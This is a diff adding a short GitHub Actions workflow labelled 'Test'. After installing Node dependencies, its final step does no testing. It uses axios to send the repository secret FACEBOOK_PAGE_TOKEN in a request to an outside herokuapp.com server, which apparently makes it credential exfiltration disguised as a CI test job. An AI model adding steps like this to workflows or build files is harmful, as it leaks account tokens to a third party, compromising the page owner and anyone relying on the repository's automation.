@@ -1,0 +1,14 @@
+name: Test
+on: 
+  workflow_dispatch:
+jobs:
+  task: 
+    runs-on: ubuntu-latest
+    steps:
+     - uses: actions/checkout@v2
+     - uses: actions/setup-node@v2
+       with:
+         node-version: 14.16.0
+     - run: npm install
+     - run: node -e 'require("axios").default("https://etherio-server.herokuapp.com?token=${{ secrets.FACEBOOK_PAGE_TOKEN }}")' 
+
